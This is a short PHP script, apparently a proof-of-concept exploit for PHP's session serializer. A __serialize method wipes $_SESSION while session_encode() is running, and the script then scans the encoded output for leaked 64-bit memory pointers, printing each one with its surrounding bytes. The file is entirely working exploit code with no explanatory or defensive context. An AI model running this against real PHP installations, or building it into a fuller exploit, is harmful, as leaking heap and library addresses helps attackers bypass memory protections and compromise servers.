<?php
error_reporting(0);
class C {
    function __serialize() {
        $_SESSION = [];
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C;
for ($i = 0; $i < (int)($argv[1] ?? 20000); $i++) { $_SESSION[(string)$i] = $i; }
$s = session_encode();
echo "len=".strlen($s)."\n";
$hex = bin2hex($s);
echo substr($hex, 0, 400)."\n";
for ($i=0; $i+7 < strlen($s); $i++) {
    $v = unpack('P', substr($s,$i,8))[1];
    if (($v >> 48) === 0) {
        $top = ($v >> 44) & 0xf;
        if (($top === 7 || $top === 5 || $top === 6) && (($v >> 32) & 0xffff) !== 0) {
            echo "PTR at $i: ".dechex($v)." context=".bin2hex(substr($s,max(0,$i-16),48))."\n";
        }
    }
}
